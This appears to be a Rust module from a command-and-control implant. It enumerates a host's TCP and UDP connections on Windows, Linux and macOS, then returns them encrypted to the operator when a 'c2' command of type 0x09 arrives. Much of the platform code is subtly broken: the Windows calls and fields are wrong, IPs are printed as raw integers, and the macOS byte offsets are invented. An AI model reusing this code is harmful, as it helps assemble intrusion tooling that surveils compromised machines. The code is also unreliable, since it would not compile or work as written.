//! Network connections module — cross-platform network enumeration.
//!
//! Collects active network connections:
//! - Windows: GetTcpTable/GetUdpTable (iphlpapi)
//! - Linux: Parse /proc/net/tcp, /proc/net/udp
//! - macOS: sysctl with net.inet.tcp.pcblist

use anyhow::Result;
use serde::{Serialize, Deserialize};
use tracing::info;

use crate::c2::Command;
use crate::crypto;
use crate::modules::ModuleError;

/// Network connection information
#[derive(Debug, Serialize, Deserialize)]
pub struct NetworkConnection {
    pub protocol: String,
    pub local_address: String,
    pub remote_address: String,
    pub state: String,
    pub pid: Option<u32>,
}

/// Network module
pub struct NetworkModule;

impl NetworkModule {
    pub fn new() -> Self {
        Self
    }

    /// Enumerate network connections (platform-specific)
    #[cfg(windows)]
    fn enumerate_connections() -> Result<Vec<NetworkConnection>, ModuleError> {
        use windows::Win32::Foundation;
        use windows::Win32::Networking::WinSock;
        use windows::Win32::System::IpHlpApi;
        use windows::Win32::Networking::WinSock::MIB_TCP_STATE;

        let mut connections = Vec::new();

        // Get TCP connections
        let mut tcp_table = std::ptr::null_mut();
        let mut size = 0;

        let result = unsafe {
            IpHlpApi::GetTcpTable(
                tcp_table,
                &mut size,
                false,
            )
        };

        if result == WinSock::ERROR_INSUFFICIENT_BUFFER.0 as i32 {
            tcp_table = unsafe { Foundation::HeapAlloc(Foundation::GetProcessHeap(), 0, size as usize) as *mut IpHlpApi::MIB_TCPTABLE };

            let result = unsafe {
                IpHlpApi::GetTcpTable(
                    tcp_table,
                    &mut size,
                    false,
                )
            };

            if result == 0 {
                let table = unsafe { &*tcp_table };
                for i in 0..table.dwNumEntries {
                    let entry = unsafe { *table.mibTcpTable.as_ptr().add(i as usize) };
                    let local_addr = format!(
                        "{}:{}",
                        u32::from_be_bytes(entry.local_address.0.to_be_bytes()),
                        u16::from_be(entry.local_port)
                    );
                    let remote_addr = if entry.state.0 == WinSock::MIB_TCP_STATE_DELETE_TCB.0 as u32 {
                        "*:*".to_string()
                    } else {
                        format!(
                            "{}:{}",
                            u32::from_be_bytes(entry.remote_address.0.to_be_bytes()),
                            u16::from_be(entry.remote_port)
                        )
                    };

                    let state = match entry.state.0 {
                        WinSock::MIB_TCP_STATE_ESTABLISHED.0 => "ESTABLISHED",
                        WinSock::MIB_TCP_STATE_LISTEN.0 => "LISTEN",
                        WinSock::MIB_TCP_STATE_CLOSE_WAIT.0 => "CLOSE_WAIT",
                        WinSock::MIB_TCP_STATE_FIN_WAIT.0 => "FIN_WAIT",
                        WinSock::MIB_TCP_STATE_TIME_WAIT.0 => "TIME_WAIT",
                        WinSock::MIB_TCP_STATE_CLOSE.0 => "CLOSED",
                        _ => "UNKNOWN",
                    };

                    connections.push(NetworkConnection {
                        protocol: "TCP".to_string(),
                        local_address: local_addr,
                        remote_address: remote_addr,
                        state: state.to_string(),
                        pid: None,
                    });
                }
            }

            unsafe {
                Foundation::HeapFree(
                    Foundation::GetProcessHeap(),
                    0,
                    tcp_table as Foundation::LPVOID,
                )
            };
        }

        // Get UDP connections
        let mut udp_table = std::ptr::null_mut();
        let mut udp_size = 0;

        let result = unsafe {
            IpHlpApi::GetUdpTable(
                udp_table,
                &mut udp_size,
                false,
            )
        };

        if result == WinSock::ERROR_INSUFFICIENT_BUFFER.0 as i32 {
            udp_table = unsafe { Foundation::HeapAlloc(Foundation::GetProcessHeap(), 0, udp_size as usize) as *mut IpHlpApi::MIB_UDPTABLE };

            let result = unsafe {
                IpHlpApi::GetUdpTable(
                    udp_table,
                    &mut udp_size,
                    false,
                )
            };

            if result == 0 {
                let table = unsafe { &*udp_table };
                for i in 0..table.dwNumEntries {
                    let entry = unsafe { *table.mibUdpTable.as_ptr().add(i as usize) };
                    connections.push(NetworkConnection {
                        protocol: "UDP".to_string(),
                        local_address: format!(
                            "{}:{}",
                            u32::from_be_bytes(entry.local_address.0.to_be_bytes()),
                            u16::from_be(entry.local_port)
                        ),
                        remote_address: "*:*".to_string(),
                        state: "UDP".to_string(),
                        pid: None,
                    });
                }
            }

            unsafe {
                Foundation::HeapFree(
                    Foundation::GetProcessHeap(),
                    0,
                    udp_table as Foundation::LPVOID,
                )
            };
        }

        Ok(connections)
    }

    #[cfg(target_os = "linux")]
    fn enumerate_connections() -> Result<Vec<NetworkConnection>, ModuleError> {
        let mut connections = Vec::new();

        // Parse /proc/net/tcp (TCP)
        if let Ok(tcp_content) = std::fs::read_to_string("/proc/net/tcp") {
            for line in tcp_content.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() < 4 {
                    continue;
                }

                let local = Self::parse_addr_port(parts[1])?;
                let remote = Self::parse_addr_port(parts[2])?;
                let state = Self::tcp_state(parts[3])?;

                connections.push(NetworkConnection {
                    protocol: "TCP".to_string(),
                    local_address: local,
                    remote_address: remote,
                    state,
                    pid: None,
                });
            }
        }

        // Parse /proc/net/udp (UDP)
        if let Ok(udp_content) = std::fs::read_to_string("/proc/net/udp") {
            for line in udp_content.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() < 4 {
                    continue;
                }

                let local = Self::parse_addr_port(parts[1])?;
                let remote = Self::parse_addr_port(parts[2])?;

                connections.push(NetworkConnection {
                    protocol: "UDP".to_string(),
                    local_address: local,
                    remote_address: remote,
                    state: "UDP".to_string(),
                    pid: None,
                });
            }
        }

        Ok(connections)
    }

    #[cfg(target_os = "macos")]
    fn enumerate_connections() -> Result<Vec<NetworkConnection>, ModuleError> {
        use sysctl::Sysctl;

        let mut connections = Vec::new();

        // TCP connections
        if let Ok(tcp) = Sysctl::new("net.inet.tcp.pcblist") {
            if let Ok(value) = tcp.value() {
                let bytes = value.as_u32_slice();
                // Parse inpcb structures (simplified)
                for chunk in bytes.chunks(128) {
                    if chunk.len() >= 128 {
                        let state = chunk[48];
                        let local_port = u16::from_be([chunk[32], chunk[33]]);
                        let remote_port = u16::from_be([chunk[36], chunk[37]]);

                        connections.push(NetworkConnection {
                            protocol: "TCP".to_string(),
                            local_address: format!(":{}", local_port),
                            remote_address: format!(":{}", remote_port),
                            state: Self::tcp_state_hex(state)?,
                            pid: None,
                        });
                    }
                }
            }
        }

        // UDP connections
        if let Ok(udp) = Sysctl::new("net.inet.udp.pcblist") {
            if let Ok(value) = udp.value() {
                let bytes = value.as_u32_slice();
                for chunk in bytes.chunks(128) {
                    if chunk.len() >= 128 {
                        let local_port = u16::from_be([chunk[32], chunk[33]]);
                        connections.push(NetworkConnection {
                            protocol: "UDP".to_string(),
                            local_address: format!(":{}", local_port),
                            remote_address: "*:*".to_string(),
                            state: "UDP".to_string(),
                            pid: None,
                        });
                    }
                }
            }
        }

        Ok(connections)
    }

    #[cfg(windows)]
    fn parse_addr_port(_hex: &str) -> Result<String, ModuleError> {
        Ok("0.0.0.0:0".to_string())
    }

    #[cfg(target_os = "linux")]
    fn parse_addr_port(hex: &str) -> Result<String, ModuleError> {
        let parts: Vec<&str> = hex.split(':').collect();
        if parts.len() != 2 {
            return Err(ModuleError::Execution("Invalid address".to_string()));
        }

        let addr_int = u32::from_str_radix(parts[0], 16)
            .map_err(|_| ModuleError::Execution("Invalid hex address".to_string()))?;
        let port = u16::from_str_radix(parts[1], 16)
            .map_err(|_| ModuleError::Execution("Invalid hex port".to_string()))?;

        // Convert little-endian IP to dotted notation
        let ip = format!(
            "{}.{}.{}.{}",
            addr_int as u8,
            (addr_int >> 8) as u8,
            (addr_int >> 16) as u8,
            (addr_int >> 24) as u8,
        );

        Ok(format!("{}:{}", ip, port))
    }

    #[cfg(target_os = "macos")]
    fn parse_addr_port(_hex: &str) -> Result<String, ModuleError> {
        Ok("0.0.0.0:0".to_string())
    }

    fn tcp_state_hex(state: u8) -> Result<String, ModuleError> {
        match state {
            0x01 => Ok("ESTABLISHED".to_string()),
            0x02 => Ok("SYN_SENT".to_string()),
            0x03 => Ok("SYN_RECEIVED".to_string()),
            0x04 => Ok("FIN_WAIT_1".to_string()),
            0x05 => Ok("FIN_WAIT_2".to_string()),
            0x06 => Ok("TIME_WAIT".to_string()),
            0x07 => Ok("CLOSE".to_string()),
            0x08 => Ok("CLOSE_WAIT".to_string()),
            0x09 => Ok("LAST_ACK".to_string()),
            0x0A => Ok("LISTEN".to_string()),
            _ => Ok("UNKNOWN".to_string()),
        }
    }

    fn tcp_state(hex: &str) -> Result<String, ModuleError> {
        match hex {
            "01" => Ok("ESTABLISHED".to_string()),
            "02" => Ok("SYN_SENT".to_string()),
            "03" => Ok("SYN_RECEIVED".to_string()),
            "04" => Ok("FIN_WAIT_1".to_string()),
            "05" => Ok("FIN_WAIT_2".to_string()),
            "06" => Ok("TIME_WAIT".to_string()),
            "07" => Ok("CLOSE".to_string()),
            "08" => Ok("CLOSE_WAIT".to_string()),
            "09" => Ok("LAST_ACK".to_string()),
            "0A" => Ok("LISTEN".to_string()),
            _ => Ok("UNKNOWN".to_string()),
        }
    }
}

#[async_trait::async_trait]
impl crate::modules::Module for NetworkModule {
    fn name(&self) -> &str {
        "network"
    }

    async fn execute(&self, cmd: &Command) -> Result<Vec<u8>, ModuleError> {
        if cmd.cmd_type != 0x09 {
            return Err(ModuleError::Execution("no_match".to_string()));
        }

        let connections = Self::enumerate_connections()?;

        // Serialize connection info
        let json = serde_json::to_string_pretty(&connections)
            .map_err(|e| ModuleError::Execution(format!("JSON serialize: {}", e)))?;

        // Encrypt result
        let encrypted = crypto::encrypt_with_integrity(json.as_bytes(), &cmd.crypto_key);

        info!("Network: {} connections enumerated", connections.len());
        Ok(encrypted)
    }
}
